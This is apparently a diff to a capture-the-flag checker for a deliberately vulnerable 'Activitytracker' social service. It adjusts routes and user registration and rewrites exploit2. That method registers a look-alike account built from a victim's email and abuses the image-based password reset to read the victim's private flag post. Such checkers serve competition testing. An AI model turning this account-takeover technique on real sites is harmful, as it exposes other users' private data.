@@ -64,10 +64,12 @@ class ActivitytrackerChecker(BaseChecker):
         im.save(filename, format='png')
         return filename
 
-    def register_user(self, email: str, password: str):
-        self.http_get("/auth/signup")
+    def register_user(self, email: str, password: str, image_path: str = ""):
         filename = "/tmp/" + secrets.token_urlsafe(10) + ".png"
-        self.generate_random_image(filename)
+        if image_path:
+            filename = image_path
+        else:
+            self.generate_random_image(filename)
         with open(filename, 'rb') as verification_image:
             resp = self.http_post("/auth/signup",
                                   data={
@@ -81,7 +83,6 @@ class ActivitytrackerChecker(BaseChecker):
             raise EnoException(f"Unexpected status code while registering user: {resp.status_code}")
 
     def login_user(self, email: str, password: str):
-        self.http_get("/auth/login")
         resp = self.http_post("/auth/login",
                               data={
                                   "email": email,
@@ -136,14 +137,12 @@ class ActivitytrackerChecker(BaseChecker):
 
             self.register_user(email, password)
 
-            self.http_get('/posts/0')
 
             self.generate_random_posts(random.randint(0, 3),
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password,
                                              "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
 
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": f"I love working here at {company} as a {jobtitle}. We even have our own gym! My boss {boss_firstname} {boss_lastname} is great, and I'll get a promotion soon! Come work here as well! Cheers, {firstname} {lastname}",
                 "visibility": "public",
@@ -154,11 +153,9 @@ class ActivitytrackerChecker(BaseChecker):
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password,
                                              "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
-            self.http_get('/posts/0')
 
             self.http_get('/auth/logout')
             self.register_user(boss_email, boss_password)
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": self.flag,
                 "visibility": "private",
@@ -182,13 +179,10 @@ class ActivitytrackerChecker(BaseChecker):
 
             self.register_user(email, password)
 
-            self.http_get('/posts/0')
-
             self.generate_random_posts(random.randint(0, 3),
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password}, templates='simple')
 
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": f"A friend of mine keeps posting their passwords! LOL!",
                 "visibility": "public",
@@ -198,7 +192,6 @@ class ActivitytrackerChecker(BaseChecker):
             self.generate_random_posts(random.randint(0, 3),
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password}, templates='simple')
-            self.http_get('/posts/0')
 
             self.http_get('/auth/logout')
 
@@ -254,8 +247,6 @@ class ActivitytrackerChecker(BaseChecker):
 
             self.register_user(email, password)
 
-            self.http_get('/posts/0')
-
             self.generate_random_posts(random.randint(0, 3),
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password,
@@ -267,7 +258,6 @@ class ActivitytrackerChecker(BaseChecker):
                 "protected": "true"
             })
 
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": self.flag,
                 "visibility": "private",
@@ -278,7 +268,6 @@ class ActivitytrackerChecker(BaseChecker):
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password,
                                              "boss_firstname": boss_firstname, "boss_lastname": boss_lastname})
-            self.http_get('/posts/0')
 
             self.http_get('/auth/logout')
 
@@ -294,7 +283,7 @@ class ActivitytrackerChecker(BaseChecker):
     def check_pages(self, flag):
         page = 0
         while 1:
-            resp = self.http_get(f"/posts/{page}")
+            resp = self.http_get(f"/posts/view/{page}")
             t = html.unescape(resp.text)
             if "Activities by" not in t:
                 return ""
@@ -395,7 +384,6 @@ class ActivitytrackerChecker(BaseChecker):
                 p = False
             elif private == 0:
                 p = True
-            self.http_get('/posts/new')
             while 1:
                 try:
                     if random.random() < 0.3:
@@ -436,8 +424,6 @@ class ActivitytrackerChecker(BaseChecker):
             self.generate_random_posts(n=random.randint(0, 3),
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password}, templates="simple")
-            self.http_get('/posts/0')
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": text,
                 "visibility": "public" if self.variant_id == 0 else "private",
@@ -446,7 +432,6 @@ class ActivitytrackerChecker(BaseChecker):
             self.generate_random_posts(n=random.randint(0, 3),
                                        data={"firstname": firstname, "lastname": lastname, "company": company,
                                              "jobtitle": jobtitle, "password": password}, templates="simple")
-            self.http_get('/posts/0')
 
             self.http_get('/auth/logout')
             self.chain_db = {
@@ -531,8 +516,6 @@ class ActivitytrackerChecker(BaseChecker):
 
             self.register_user(email, password)
 
-            self.http_get('/posts/0')
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": text,
                 "visibility": "public" if self.variant_id == 0 else "private",
@@ -555,8 +538,6 @@ class ActivitytrackerChecker(BaseChecker):
 
             random_validation_text = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(64))
 
-            self.http_get('/posts/0')
-            self.http_get('/posts/new')
             self.http_post('/posts/insert', files={
                 "body": random_validation_text,
                 "visibility": "public",
@@ -641,7 +622,7 @@ class ActivitytrackerChecker(BaseChecker):
         self.register_user(email, password)
         page = 0
         while page < 5:
-            resp = self.http_get(f"/posts/{page}")
+            resp = self.http_get(f"/posts/view/{page}")
             t = html.unescape(resp.text)
             if "Activities by" not in t:
                 break
@@ -677,12 +658,10 @@ class ActivitytrackerChecker(BaseChecker):
 
     def exploit2(self):
         # Create new account
-        email_my = f"{secrets.token_urlsafe(16)}@gmail.com"
         password_my = secrets.token_urlsafe(16)
-        self.register_user(email_my, password_my)
         page = 0
         while page < 5:
-            resp = self.http_get(f"/posts/{page}")
+            resp = self.http_get(f"/posts/view/{page}")
             t = html.unescape(resp.text)
             if "Activities by" not in t:
                 break
@@ -696,19 +675,10 @@ class ActivitytrackerChecker(BaseChecker):
                     post = re.search(self.pattern3, section)
                     if not post:
                         continue
-                    self.http_get('/auth/logout')
-                    self.login_user(email_my, password_my)
                     image_name = f"/tmp/tmp.png"
                     self.generate_random_image(image_name)
-                    with open(image_name, 'rb') as image:
-                        image_upload_name = f"profiles/{email}.png"
-                        self.http_post('/posts/insert', data={
-                            "body": "???",
-                            "visibility": "private",
-                            "protected": "false"
-                        }, files={
-                            "image": (image_upload_name, image)
-                        })
+                    print(email)
+                    self.register_user(f"{email}.{secrets.token_urlsafe(2)}.{secrets.token_urlsafe(2)}.{secrets.token_urlsafe(2)}", password_my, image_name)
                     self.http_get('/auth/logout')
                     with open(image_name, 'rb') as image:
                         self.http_post('/auth/forgot', data={
@@ -719,6 +689,7 @@ class ActivitytrackerChecker(BaseChecker):
                         })
                     # get flag
                     resp = self.http_get(f"/posts/friends")
+                    print(resp)
                     t = html.unescape(resp.text)
                     f = self.search_flag(t)
                     if f:
@@ -733,7 +704,7 @@ class ActivitytrackerChecker(BaseChecker):
         self.register_user(email, password)
         page = 0
         while page < 5:
-            resp = self.http_get(f"/posts/{page}")
+            resp = self.http_get(f"/posts/view/{page}")
             t = html.unescape(resp.text)
             if "Activities by" not in t:
                 break
@@ -763,6 +734,8 @@ class ActivitytrackerChecker(BaseChecker):
                         f = self.search_flag(t)
                         if f:
                             return f
+                        if n > 20:
+                            break
                 except:
                     pass
 
